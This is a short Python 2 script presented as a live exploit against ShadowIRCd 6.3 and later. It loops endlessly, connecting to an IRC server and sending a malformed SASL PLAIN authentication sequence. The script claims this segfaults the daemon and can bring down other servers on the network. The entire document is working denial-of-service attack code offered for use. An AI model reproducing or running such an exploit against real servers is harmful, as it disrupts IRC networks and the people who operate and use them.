#!/usr/bin/python2
# Live exploit for ShadowIRCd 6.3+, remote segfault that can
# take out other daemons in the network.

import base64
import socket

SERVER = "irc.example.com"
NICK = "Shi" # death
PASS = "ku"  # suffering

while True:
    s_link = socket.socket()

    s_link.connect((SERVER, 6667))

    s_link.send("CAP REQ :sasl\r\n")
    s_link.send("AUTHENTICATE PLAIN\r\n")
    s_link.send("AUTHENTICATE %s" %
            (base64.b64encode("%s\0%s\0%s" % (NICK, NICK, PASS))))
    s_link.send("CAP END")
    s_link.send("NICK %s\r\n" % NICK)
    s_link.send("USER a a a a a\r\n")

    try:
        for line in s_link.makefile("r"):
            print line
    except:
        continue
